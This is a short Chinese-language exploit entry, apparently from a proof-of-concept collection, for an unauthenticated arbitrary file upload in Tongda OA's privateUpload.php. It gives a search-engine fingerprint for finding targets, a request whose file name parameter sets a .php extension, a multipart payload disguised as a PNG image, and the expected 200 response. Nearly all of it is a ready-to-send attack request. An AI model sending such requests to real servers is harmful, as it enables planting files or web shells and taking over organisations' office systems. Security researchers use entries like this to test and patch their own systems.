# 通达OAprivateUpload前台任意文件上传漏洞

通达OA ｜ 文件上传 ｜ —
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/vmeet/privateUpload.php?fileName=dudesuite.php+ HTTP/1.1`

**Payload**
```
--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="1.png"
Content-Type: image/png
dudesuite
--00content0boundary00--
```
- **响应特征**：200